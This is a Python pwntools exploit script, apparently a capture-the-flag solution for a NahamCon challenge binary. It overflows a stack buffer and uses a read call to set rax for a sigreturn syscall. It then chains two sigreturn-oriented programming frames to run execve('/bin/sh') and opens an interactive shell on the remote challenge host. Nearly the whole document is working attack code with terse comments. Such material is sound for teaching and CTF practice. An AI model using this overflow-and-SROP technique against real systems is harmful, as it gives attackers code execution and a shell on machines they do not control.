#!/usr/bin/env python3

# 2 srop version

from pwn import *

binary = context.binary = ELF('./some-really-ordinary-program')
binary.symbols['main'] = 0x401022
binary.symbols['midread'] = 0x401006

if args.REMOTE:
	p = remote('challenge.nahamcon.com', 32629)
else:
	p = process(binary.path)

syscall = next(binary.search(asm('syscall')))
stack = 0x4027f8

frame = SigreturnFrame()
frame.rsp = stack
frame.rip = binary.sym.main

# overflow buffer
# get control of RIP
# call the read function to get 0xf in rax for syscall
# sigret
payload  = b''
payload += (0x1f4 + 8) * b'A'
payload += p64(binary.sym.midread)
payload += p64(syscall)
payload += bytes(frame)

p.sendafter('.\n',payload)
time.sleep(.1) # for read to exit

# with read called, get 0xf in rax
p.send(constants.SYS_rt_sigreturn * b'A')
time.sleep(.1) # for read to exit

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack - 8
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

# new stack that we know address of
# 2nd srop
payload  = b''
payload += 0x1f4 * b'A'
payload += b'/bin/sh\0'
payload += p64(binary.sym.midread)
payload += p64(syscall)
payload += bytes(frame)

p.sendafter('.\n',payload)
time.sleep(.1) # for read to exit

# with read called, get 0xf in rax
p.send(constants.SYS_rt_sigreturn * b'A')

# take out the garbage
p.recvuntil(flat(frame))
p.interactive()
